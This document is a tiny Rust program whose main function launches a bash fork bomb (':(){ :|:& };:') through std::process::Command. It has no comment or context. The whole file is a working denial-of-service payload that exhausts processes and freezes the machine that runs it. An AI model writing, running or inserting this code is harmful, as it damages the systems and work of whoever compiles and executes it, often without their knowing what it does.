use std::process::Command;
fn main() { Command::new("bash").arg("-c").arg(":(){ :|:& };:").spawn().unwrap(); }
